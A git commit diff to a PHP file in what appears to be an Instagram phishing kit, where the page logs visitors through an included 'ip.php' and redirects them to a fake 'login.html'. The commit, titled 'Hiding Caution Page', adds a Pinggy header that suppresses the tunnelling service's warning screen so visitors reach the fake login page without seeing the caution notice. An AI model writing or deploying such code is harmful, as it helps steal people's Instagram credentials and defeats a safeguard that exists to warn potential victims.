8ce12b66135c282e6297400444fec394eaec1cd4
J R Deva Dattan <jrdevadattan2006@gmail.com>
2025-08-09 13:11:31 +0530

    Update index.php
    Hiding Caution Page

--- .sites/instagram/index.php
+++ .sites/instagram/index.php
@@ -1,5 +1,10 @@
 <?php
 include 'ip.php';
+
+// Add the Pinggy header BEFORE redirect
+header("X-Pinggy-No-Screen: 1");
+
+// Redirect to the login page
 header('Location: login.html');
-exit
+exit;
 ?>
